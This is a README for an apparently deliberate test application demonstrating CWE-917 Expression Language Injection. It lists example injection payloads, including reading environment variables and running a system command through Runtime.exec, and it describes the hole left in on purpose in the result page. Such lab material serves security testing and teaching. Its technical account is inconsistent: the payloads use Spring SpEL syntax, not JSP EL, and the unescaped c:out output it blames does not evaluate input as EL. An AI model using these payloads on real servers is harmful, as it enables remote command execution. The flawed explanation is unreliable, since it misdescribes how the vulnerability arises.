# Test 75 - CWE-917: Expression Language Injection

A Spring Boot web application that demonstrates CWE-917 (Expression Language Injection) using JSP EL templates.

## Running the Application

### Using Docker
```bash
docker build -t test-75-web .
docker run -p 8080:80 test-75-web
```

## Usage

1. Access the application at http://localhost:8080
2. Enter JSP EL expressions in the form
3. Submit to see the expressions evaluated on the server

## Example Attacks

- `7*7` - Basic expression evaluation
- `T(java.lang.System).getProperty('java.version')` - Java version
- `T(java.lang.System).getenv('PATH')` - Environment variables
- `new String(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream().readAllBytes())` - Command execution

## Project Structure

```
src/
└── main/
    ├── java/
    │   └── com/vulnerable/
    │       ├── Test75WebApplication.java    # Main application class
    │       ├── VulnerableController.java    # Controller with vulnerable endpoint
    │       └── WebConfig.java               # JSP view resolver config
    └── webapp/
        └── WEB-INF/
            └── jsp/
                ├── index.jsp               # Input form
                └── result.jsp              # Vulnerable result page
```

## Vulnerability Details

The application uses `<c:out value="${userInput}" escapeXml="false"/>` in the result JSP, which processes user input through JSP EL without sanitization, allowing Expression Language Injection (CWE-917). 